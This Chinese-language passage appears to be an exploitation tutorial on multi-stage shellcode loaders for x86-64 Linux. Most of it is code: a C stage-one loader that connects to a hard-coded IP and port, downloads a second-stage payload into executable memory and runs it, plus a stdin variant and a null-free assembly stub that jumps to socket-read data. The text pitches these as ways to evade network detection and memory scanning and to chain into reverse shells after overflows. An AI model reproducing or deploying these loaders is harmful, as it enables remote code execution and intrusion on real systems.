汇编loader需编译为独立对象：nasm -f elf64 loader.asm -o loader.o; gcc -no-pie test.c loader.o -o test。注意：现代系统默认栈不可执行，需编译时加上-z execstack或使用mprotect。实际利用中，loader通常作为ROP链的一部分，通过控制寄存器调用。
此方法适用于堆可写但不可执行，而栈被设置为可执行的场景。若栈也不可执行，则需结合mprotect。

多阶段loader用于绕过网络检测或内存扫描，第一阶段通常很小，负责建立网络连接并下载第二阶段payload到内存，然后跳转执行。在x86-64 Linux上，第一阶段可以使用socket、connect、read、mmap等系统调用。由于第一阶段需要紧凑且无空字节，通常用汇编编写，但也可以使用C语言编译后提取shellcode。以下是一个C语言实现的第一阶段loader，它通过TCP连接到指定IP和端口，读取第二阶段shellcode到堆内存，然后执行。注意：为了生成shellcode，需要静态编译并去除符号，且避免使用libc函数（使用内联汇编系统调用）。

c
// stage1.c - 编译: gcc -nostdlib -static -fPIC -o stage1 stage1.c
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>
#include <sys/mman.h>

void _start() {
    int sock;
    struct sockaddr_in addr;
    char *buf;
    int size = 4096; // 第二阶段最大大小

    // 创建socket
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) return;

    // 连接远程服务器 (IP: 192.168.1.100, 端口: 4444)
    addr.sin_family = AF_INET;
    addr.sin_port = htons(4444);
    addr.sin_addr.s_addr = inet_addr("192.168.1.100");
    if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) < 0) return;

    // 分配可执行内存
    buf = mmap(NULL, size, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
    if (buf == MAP_FAILED) return;

    // 读取第二阶段
    int total = 0;
    while (total < size) {
        int n = read(sock, buf + total, size - total);
        if (n <= 0) break;
        total += n;
    }
    close(sock);

    // 执行第二阶段
    void (*code)() = (void (*)())buf;
    code();
}


编译后使用objcopy提取二进制段，然后手动去除空字节（如替换inet_addr为手动构造IP）。实际shellcode中需避免使用libc函数，应直接使用内联汇编系统调用。更紧凑的方式是完全用汇编编写，使用syscall指令。该loader可配合第二阶段任意shellcode（如反弹shell）。注意：IP地址和端口硬编码，可动态修改。

多阶段loader用于解决第一阶段shellcode体积受限（如缓冲区溢出只能写入少量字节）的问题。第一阶段（stage1）负责从某个通道（socket、文件、管道等）读取第二阶段（stage2）并跳转执行。

原理：stage1通常很短（如几十字节），包含读取函数（如read syscall）和跳转。stage2是实际功能shellcode（如execve）。

C语言实现（模拟stage1逻辑）：
c
// stage1: 从stdin读取stage2到rwx内存，然后执行
#include <sys/mman.h>
#include <unistd.h>
#include <string.h>

int main() {
    // 分配可执行内存
    void *buf = mmap(NULL, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC, 
                     MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
    // 从stdin读取stage2
    ssize_t n = read(0, buf, 0x1000);
    if (n <= 0) return 1;
    // 执行stage2
    void (*func)() = buf;
    func();
    return 0;
}


汇编stage1（x86-64，无空字节，用于socket读取）：
assembly
; stage1: 从socket fd读取stage2到栈上，然后跳转
; 假设socket fd在rdi中（由调用者传入）
; 使用read syscall (0)
section .text
global _start
_start:
    sub rsp, 0x1000        ; 在栈上分配空间
    mov rsi, rsp           ; buffer = rsp
    mov rdx, 0x1000        ; size
    xor rax, rax           ; syscall read = 0
    syscall
    ; 此时rax为读取字节数，可忽略
    jmp rsp                ; 跳转到stage2


实际注入时，攻击者先发送stage1，然后发送stage2。stage1通过read从已建立的连接读取后续数据。
